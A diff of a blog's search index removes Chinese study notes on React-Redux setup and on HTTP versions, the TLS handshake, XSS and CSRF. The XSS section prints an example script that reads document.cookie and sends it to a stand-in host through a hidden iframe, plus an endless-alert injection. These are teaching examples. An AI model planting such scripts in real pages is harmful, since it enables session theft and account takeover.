-<h2 id="React-Redux实际操作步骤"><a href="#React-Redux实际操作步骤" class="headerlink" title="React-Redux实际操作步骤"></a>React-Redux实际操作步骤</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>在src下新建名为<code>redux</code>的文件，并创建好4个common JS文件，分别为<code>store.js</code>, <code>reducer.js</code>, <code>action.js</code>以及<code>constant.js</code>。其中<code>constant.js</code>用于存储常量，其余三个代表redux的三个核心。</p>
-<p>注：如果不只一个<code>action/reducer</code>，可以分别创建action和reducer的文件夹。</p>
-<p>在<code>index.js</code>中引入<code>store.js</code>，并从<code>react-redux</code>中引入<code>Provider</code>，<code>Provider</code>组件用于给<code>App</code>下的每个需要用到redux的组件传递<code>store</code>。实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./redux/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    <span class="comment">//为所有组件提供store</span></span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App /&gt;</span><br><span class="line">    &lt;/Provider&gt;,</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="步骤二——编写store"><a href="#步骤二——编写store" class="headerlink" title="步骤二——编写store"></a>步骤二——编写store</h3><p>在store文件中引入能创建<code>store</code>实例的<code>creatStore</code>、能修改状态的<code>reducer</code>和能执行异步的<code>thunk</code>和中间件<code>applyMiddleware</code>（如果需要）。</p>
-<p>注：<strong>对于多个状态需要维护的情况，从<code>redux</code>中引入<code>combineReducers</code>方法，该方法可以通过对象<code>&#123;&#125;</code>的键值对<code>key:value</code>形式，维护任意多个状态（即reducer）。</strong></p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore, applyMiddleware, combineReducers&#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> countReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/count&#x27;</span></span><br><span class="line"><span class="keyword">import</span> personReducer <span class="keyword">from</span> <span class="string">&#x27;./reducers/person&#x27;</span></span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">&#x27;redux-thunk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> allReducers = combineReducers(&#123;<span class="attr">count</span>: countReducer, <span class="attr">people</span>: personReducer&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(allReducers, applyMiddleware(thunk))</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>
-<h3 id="步骤三——编写action"><a href="#步骤三——编写action" class="headerlink" title="步骤三——编写action"></a>步骤三——编写action</h3><p>引入store文件，和常量文件constant（如果有）。编写action函数，其会返回一个action对象，形式为<code>&#123;type:&quot;&quot;, data:&quot;&quot;&#125;</code>。</p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
-<p>实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
-<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
 
 
 
@@ -1129,190 +1129,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>HTTP&amp;网络安全篇</title>
-    <url>/2021/12/06/HTTP&amp;Network/</url>
-    <content><![CDATA[<p><strong>本篇文章主要针对常见的一些计算机网络概念进行梳理和总结，便于今后对于web开发的深入理解。</strong></p>
-<a id="more"></a>
-
-<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="HTTP协议篇"><a href="#HTTP协议篇" class="headerlink" title="HTTP协议篇"></a>HTTP协议篇</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP是基于TCP/IP协议的<strong>应用层协议</strong>。它不涉及数据报传输，主要规定了客服端与服务器的通信格式，默认使用80端口。</p>
-<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
-<li><p>1996年——发布</p>
-</li>
-<li><p>1.0版本较0.9版本中只有GET命令的情况，还引入了POST和HEAD命令。</p>
-</li>
-<li><p>HTTP请求和回应格式，除了包括<strong>数据部分</strong>还必须包括<strong>头信息即HTTP HEADER</strong>（用来描述元数据）</p>
-</li>
-</ul>
-<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>请求命令+多行头信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 请求命令</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) 多行头信息</span><br><span class="line">Accept: *&#x2F;* 多行头信息</span><br></pre></td></tr></table></figure>
-<h4 id="回应格式"><a href="#回应格式" class="headerlink" title="回应格式"></a>回应格式</h4><p>头信息+空行+数据。第一行为协议版本+状态码+状态描述</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK 第一行</span><br><span class="line">Content-Type: text&#x2F;plain  从这儿开始是头信息</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											这个是空行</span><br><span class="line">&lt;html&gt;												从这儿开始是数据</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a>Content-Type 字段</h4><p>头信息为ASCII码，但数据可以为任意格式。因此需要用**<code>Content-Type</code>告诉客户端该数据的格式**。</p>
-<p>常见的<code>Content-Type</code>字段值如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
-<p>这些数据类型统称为 <strong>MIME type</strong>，格式为：一级类型/二级类型。</p>
-<h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a>Content-Encoding 字段</h4><p>由于<strong>发送的数据可以为任意格式</strong>，因此可以把数据压缩后再发送。**<code>Content-Encoding</code>字段说明数据的压缩方式**。常见压缩方法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
-<p>同时<strong>客户端在请求时</strong>，可以说明自己所<strong>接受的压缩方式</strong>，使用**字段<code>Accept-Encoding</code>**。如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
-<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>HTTP/1.0 主要问题是：<strong>每个TCP连接只能发送一个请求</strong>。数据发送完毕，链接就关闭了。再请求其它资源，就必须再新建一个TCP连接。而TCP连接需要客户端与服务器三次握手，并且开始时由于slow start，速度很慢，因此新建TCP连接成本很高。</p>
-<p><strong>为了解决这个问题，部分浏览器使用了非标准字段<code>Connection</code>。</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>上面这个字段要求服务器不要关闭TCP连接，以便其它请求复用，该可复用的TCP连接直到客户端或服务器主动关闭，才会断开。但这种方法并不标准。</p>
-<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>从1997沿用至201几，直到HTTPS。</p>
-<h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul>
-<li>1.1版本<strong>最大的变化</strong>就是引入了<strong>持久连接（persistent connection）</strong>，即TCP连接默认不关闭，可以被多个请求复用，并且不用声明<code>Connection:keep-alive</code>。</li>
-<li>客户端与服务器之间一段时间没有通信，就会主动关闭连接。但规范做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li>
-</ul>
-<p><strong>注：</strong>对于同一个域名，大多数浏览器允许同时建立<strong>6个持久连接</strong>。</p>
-<h4 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h4><p>在1.0版本中，在同一个TCP连接里，如果客户端要<strong>请求两个资源</strong>，会<strong>先发送A请求</strong>，然后等待服务器回应，<strong>收到响应</strong>之后<strong>再发送B请求</strong>。</p>
-<p>在1.1版本中引入了<strong>管道机制（pipelining）</strong>，其允许浏览器<strong>同时发送A请求和B请求</strong>，但服务器还是按照顺序，先回应A请求，完成之后再回应B请求。</p>
-<p>因此，管道机制使<strong>客户端可以在同一个TCP连接中同时发送多个请求</strong>。</p>
-<h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p><strong>用于声明本次回应的数据长度。</strong></p>
-<h4 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h4><p>简言之，就是服务器<strong>产生一块数据就发送一块</strong>，即采用流模式（stream）取代缓存模式（buffer）。</p>
-<p>因此，1.1版本可以不使用<code>Content-Length</code>字段，而使用分块传输编码（chunked transfer encoding）。只要<strong>请求或回应的头信息中有<code>Transfer-Encoding</code>字段</strong>，就表明回应将由数量未定的数据块组成。</p>
-<p><strong>注：</strong>每个非空的数据块之前，会有一个16进制的数值来表示这个块的长度。最后是一个大小为0的块，表示本次回应的数据发送完毕。示例如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<h4 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h4><ul>
-<li>1.1版本还新增了许多动词方法，如：<code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
-<li>客户端请求头信息<strong>新增了<code>HOST</code>字段</strong>，用来指定服务器的域名。有了<code>HOST</code>字段就可以将请求发往同一服务器上的不同网站。（为虚拟机兴起打下基础）</li>
-</ul>
-<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>存在<strong>队头堵塞（Head-of-line blocking）</strong>。尽管允许复用TCP连接，但在<strong>同一个TCP连接里，数据通信依然是按次序进行</strong>，服务器只有处理完第一个请求的回应，才能进行下一个请求的回应。如果前一个请求的回应很慢，那么后面就会有许多请求排队。</p>
-<p>避免队头堵塞的方法有：</p>
-<pre><code>1. **减少请求次数**。例如：合并脚本和样式表、将图片嵌入CSS代码
-1. **同时多开持久连接**。例如：域名分片（domain sharding）即所需下载可以来自多个域，可以解决并发限制。
-</code></pre>
-<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="二进制协议"><a href="#二进制协议" class="headerlink" title="二进制协议"></a>二进制协议</h4><p>HTTP/1.1版本的头信息是文本（ASCII码），数据体是文本或二进制。但HTTP/2则是一个<strong>彻底的二进制协议</strong>，头信息和数据体都是二进制，并且统称为“帧”（frame）：头信息帧和数据帧。</p>
-<p>二进制协议的好处是：可以定义额外的帧。</p>
-<h4 id="多工-Multiplexing"><a href="#多工-Multiplexing" class="headerlink" title="多工 Multiplexing"></a>多工 Multiplexing</h4><p>在HTTP/2中，在同一个TCP连接中，客户端和浏览器都可以同时发送多个请求和响应，并且不用按照顺序一一对应，这就避免了队头堵塞的问题。</p>
-<p>例如：在一个TCP连接中，服务器同时收到A请求和B请求，于是先回应A请求，结果发现处理十分耗时，于是就发送A请求已处理好的部分，接着处理回应B请求，完成之后，再处理发送A请求的剩下的部分。我们称这种<strong>双工的、实时的通信</strong>为<strong>多工</strong>。</p>
-<h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>HTTP/2的<strong>数据包是不按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应，因此需要<strong>对数据包进行标记</strong>，指出它属于哪个回应。</p>
-<p>HTTP/2将<strong>每个请求或者回应的所有数据包</strong>都称为一个<strong>数据流（stream）</strong>。每个数据流都有一个唯一的编号。数据包发送的时候，必须标记数据流ID，一标识它属于哪个数据流。此外客户端发出的数据流ID一律为奇数，服务端发出的数据流ID一律为偶数。</p>
-<p>数据流发送到一半时，客户端和服务器都可以发出信号来取消这个数据流。在HTTP/1.1版本中，取消数据流发送的唯一方法是关闭TCP连接。HTTP/2可以取消某一次请求同时保证TCP连接还是开启的状态，可以被其它请求复用。</p>
-<p>客户端还可以指定数据流的优先级，优先级越高，服务器会越早对其回应。</p>
-<h4 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a>头信息压缩</h4><p>由于每次请求，很多<strong>请求头信息中的字段都是重复的</strong>（如Cookie、User Agent等），这会造成很多带宽的浪费。HTTP/2优化了这一点，引入<strong>头信息压缩机制</strong>。一方面，头信息<strong>使用<code>gzip</code><strong>等方法压缩后再发送；另一方面，客户端和服务端维护一张</strong>头信息表</strong>，该表为<strong>字段和索引号的映射</strong>，之后就只发送索引号，以提高速度。</p>
-<h4 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h4><p>HTTP/2允许服务器未收到请求，主动向客户端发送资源。</p>
-<p>例如：客户端请求一个包含很多静态资源的网页，服务器会主动把这些静态资源随网页一起发送给客户端，这样就不需要等客户端收到网页后解析HTML发现有静态资源再请求静态资源了。</p>
-<h2 id="HTTPS——番外篇"><a href="#HTTPS——番外篇" class="headerlink" title="HTTPS——番外篇"></a>HTTPS——番外篇</h2><p>互联网的通信安全是建立在<strong>SSL/TLS</strong>协议之上的。</p>
-<p><strong>注</strong>：SSL——<strong>Secure Sockets Layer</strong>, TLS——SSL的升级</p>
-<h3 id="使用HTTPS的原因-amp-作用"><a href="#使用HTTPS的原因-amp-作用" class="headerlink" title="使用HTTPS的原因&amp;作用"></a>使用HTTPS的原因&amp;作用</h3><p><strong>对比：</strong></p>
-<ul>
-<li><p>HTTP不使用SSL/TLS，因此是不加密的通信，所有信息都是明文传播</p>
-<ol>
-<li><strong>窃听风险（eavesdropping）：</strong>第三方可以截获并获知通信内容</li>
-<li><strong>篡改风险（tampering）：</strong>第三方可以截获并修改通信内容</li>
-<li><strong>冒充风险（pretending）：</strong>第三方可以冒充他人身份参与通信</li>
-</ol>
-</li>
-<li><p>基于SSL/TLS协议的HTTPS的好处</p>
-<ol>
-<li><strong>所有信息都是加密传输</strong>——无法被窃听</li>
-<li><strong>具有校验机制</strong>——通信内容一旦被篡改，通信双方都能发现</li>
-<li><strong>配备身份证书</strong>——防止身份冒充</li>
-</ol>
-</li>
-</ul>
-<h3 id="SSL-TLS协议的基本运行过程"><a href="#SSL-TLS协议的基本运行过程" class="headerlink" title="SSL/TLS协议的基本运行过程"></a>SSL/TLS协议的基本运行过程</h3><p>该协议的基本思路为：<strong>非对称加密：公钥加密，私钥解密</strong>。即客户端先向服务端索要公钥，然后再用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
-<ol>
-<li><p><strong>保证公钥不被篡改的方法</strong></p>
-<p>答：将<strong>公钥放入数字证书</strong>中，只要证书是可信的，那么公钥就是可信的。</p>
-</li>
-<li><p><strong>用公钥加密计算量太大，需要减少耗用时间的方法</strong></p>
-<p>答：每一次对话（session），客户端和服务端会生成一个“对话密钥”（session key），用它来加密信息。由于“对话密钥”是对称加密，因此运算速度非常快，因此如果服务器公钥只用于加密“对话密钥”本身的话，就会大大减少加密运算的消耗时间。</p>
-</li>
-</ol>
-<p>所以，SSL/TLS协议的基本过程是：</p>
-<ol>
-<li>客户端向服务端<strong>索要并验证公钥</strong> —— 握手阶段</li>
-<li>双方协商<strong>生成“对话密钥”</strong>              —— 握手阶段</li>
-<li>双方采用“对话密钥”<strong>进行加密通信</strong></li>
-</ol>
-<h3 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h3><p>握手阶段涉及四次通信，该阶段的所有通信都是明文的。</p>
-<h4 id="阶段一：客户端发出请求"><a href="#阶段一：客户端发出请求" class="headerlink" title="阶段一：客户端发出请求"></a>阶段一：客户端发出请求</h4><p>首先，客户端向服务器发送加密通信请求。其发送的请求内容主要有以下：</p>
-<ol>
-<li>支持的协议版本，例如：TLS 1.0</li>
-<li>客户端生成的随机数，用于稍后生成“对话密钥”</li>
-<li>支持的加密方法，例如：RSA公钥加密</li>
-<li>支持的压缩方法</li>
-</ol>
-<h4 id="阶段二：服务器回应"><a href="#阶段二：服务器回应" class="headerlink" title="阶段二：服务器回应"></a>阶段二：服务器回应</h4><p>服务器收到客户端请求后，向客户端发出响应。响应内容主要包括以下：</p>
-<ol>
-<li>确认使用的加密通信协议版本。如果双方支持的版本不一致，则服务器会关闭本次加密通信</li>
-<li>服务器生成的随机数，用于稍后生成“对话密钥”</li>
-<li>确认使用的加密方法</li>
-<li>服务器证书</li>
-</ol>
-<h4 id="阶段三：客户端回应"><a href="#阶段三：客户端回应" class="headerlink" title="阶段三：客户端回应"></a>阶段三：客户端回应</h4><p>客户端收到服务器的响应后，首先要验证服务器的数字证书。</p>
-<p>如果<strong>1. 证书不可信。2. 证书中的域名与实际域名不一致。3. 证书已经过期</strong>，就会向访问者显示一个警告，让其选择是否继续通信。</p>
-<p>如果证书没有问题，客户端会<strong>从证书中取出服务器的公钥</strong>，然后向服务器发送响应，其内容主要如下：</p>
-<ol>
-<li>客户端生成的随机数。该随机数用公钥加密，防止被窃听。</li>
-<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
-<li>客户端握手结束通知。表示客户端的握手阶段结束，这一项也是前面发送的所有内容的hash值，用来供服务器校验。</li>
-</ol>
-<p><strong>注：</strong>这个阶段生成的随机数是整个握手阶段出现的第三个随机数（”pre-master key”）。有了它之后，客户端和服务器就都同时有了三个随机数，然后双方用事先商定的加密方法，各自生成本次会话所用的同一把“会话密钥”。</p>
-<h4 id="阶段四：服务器最后回应"><a href="#阶段四：服务器最后回应" class="headerlink" title="阶段四：服务器最后回应"></a>阶段四：服务器最后回应</h4><p>服务器收到第三个随机数之后，会计算生成本次会话所用的“会话密钥”。然后向客户端发送最后响应。其内容主要如下：</p>
-<ol>
-<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
-<li>服务器握手结束通知。表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</li>
-</ol>
-<p>至此，整个握手阶段全部结束。接下来就是，客户端与服务器进行加密通信，这就完全是<strong>使用普通的HTTP协议</strong>了，只不过所<strong>发送的内容都使用“会话密钥”进行了加密</strong>。</p>
-<h2 id="网络安全篇"><a href="#网络安全篇" class="headerlink" title="网络安全篇"></a>网络安全篇</h2><h3 id="XSS——跨站脚本"><a href="#XSS——跨站脚本" class="headerlink" title="XSS——跨站脚本"></a>XSS——跨站脚本</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>XSS，全称为<strong>Cross-site scripting</strong>，中文名称为跨站脚本，是一种<strong>对网络应用程序的安全漏洞的攻击</strong>，即是一种<strong>代码注入</strong>。这类攻击通常包含了HTML和用户脚本语言（主要为JavaScript）。</p>
-<p>例如，用JavaScript在网站论坛上发布一段恶意的JavaScript代码，这就是脚本注入，而同时如果这个代码内容有请求外部服务器的功能，那么就叫做XSS。</p>
-<p>因此，可以理解为<strong>XSS（跨站脚本）= 脚本注入 + 请求外部服务器的功能</strong>。</p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>例如，在某论坛网站中的发帖内容写下如下代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;一直弹窗&#x27;</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>假设该论坛网站没有任何过滤及其它防御机制的情况下，任何访问这个帖子的用户，都会在客户端界面一直弹出这个弹窗。</p>
-<p><strong>这就是最简单的脚本注入。</strong>当然这个脚本并没有什么实质性的危害，那么XSS就是基于脚本注入的方法来完成，但它注入的是含有请求跨站功能的脚本。</p>
-<p>例如，在上面提到的论坛网站中，注入如下代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 构造泄露信息用的 URL</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line"><span class="javascript">    hideFrame.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line"><span class="javascript">    <span class="comment">// 开工</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span></span><br><span class="line"><span class="javascript">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该段代码会将任何访问该帖子的用户的cookie传给一个为<code>http://192.168.123.123/myxss/</code>的服务器，该服务器可以拿着这个cookie访问对应的网站，并登录该用户的账号，继而可以进行其它操作。</p>
-<p>因此，上面这段代码就是XSS。</p>
-<h3 id="CSRF——跨站请求伪造"><a href="#CSRF——跨站请求伪造" class="headerlink" title="CSRF——跨站请求伪造"></a>CSRF——跨站请求伪造</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>CSRF，全称为<strong>Cross-site request forgery</strong>，中文名为跨站请求伪造。是一种让用户在当前已登录的Web应用程序上<strong>执行一些非本意的操作</strong>（如改名，删帖，发邮件等）的攻击方法。</p>
-<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>一般来说，CSRF是由XSS实现的，在跨站脚本的基础上，实现伪造请求，导致受害者会执行一些自己本不愿意执行的操作。</p>
-<p><strong>注：CSRF也可以不通过XSS来实现。</strong></p>
